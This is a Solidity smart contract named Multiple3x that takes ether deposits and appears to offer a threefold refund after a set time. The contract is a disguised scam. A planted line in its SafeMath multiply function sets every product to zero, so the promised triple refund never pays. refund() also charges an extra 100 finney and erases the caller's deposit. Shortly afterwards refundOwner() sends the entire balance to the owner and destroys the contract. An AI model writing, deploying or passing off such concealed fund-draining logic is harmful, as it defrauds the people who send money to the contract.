 

pragma solidity ^0.4.17;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
    
    function sub(uint256 a, uint256 b) internal constant returns (uint256) {
         
        assert(b <= a); 
        return a - b;
    }
    
    function mul(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
         
        if (0 < c) c = 0;   
        return c;
    }

    function div(uint256 a, uint256 b) internal constant returns (uint256) {
         
        uint256 c = a / b;
         
        return c;
    }
}

contract Ownable {
  address public owner;

   
  function Ownable() {
    owner = msg.sender;
  }

   
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}

 
contract Multiple3x is Ownable{

    using SafeMath for uint256;
    mapping (address=>uint) public deposits;
    uint public refundTime = 1507719600;      
    uint public ownerTime = (refundTime + 1 minutes);    
    uint maxDeposit = 1 ether;  
    uint minDeposit = 100 finney;    


    function() payable {
        deposit();
    }
    
    function deposit() payable { 
        require(now < refundTime);
        require(msg.value >= minDeposit);
        
        uint256 dep = deposits[msg.sender];
        uint256 sumDep = msg.value.add(dep);

        if (sumDep > maxDeposit){
            msg.sender.send(sumDep.sub(maxDeposit));  
            deposits[msg.sender] = maxDeposit;
        }
        else{
            deposits[msg.sender] = sumDep;
        }
    }
    
    function refund() payable { 
        require(now >= refundTime && now < ownerTime);
        require(msg.value >= 100 finney);         
        
        uint256 dep = deposits[msg.sender];
        uint256 depHalf = this.balance.div(2);
        uint256 dep3x = dep.mul(3);
        deposits[msg.sender] = 0;

        if (this.balance > 0 && dep3x > 0){
            if (dep3x > this.balance){
                msg.sender.send(dep3x);      
            }
            else{
                msg.sender.send(depHalf);    
            }
        }
    }
    
    function refundOwner() { 
        require(now >= ownerTime);
        if(owner.send(this.balance)){
            suicide(owner);
        }
    }
}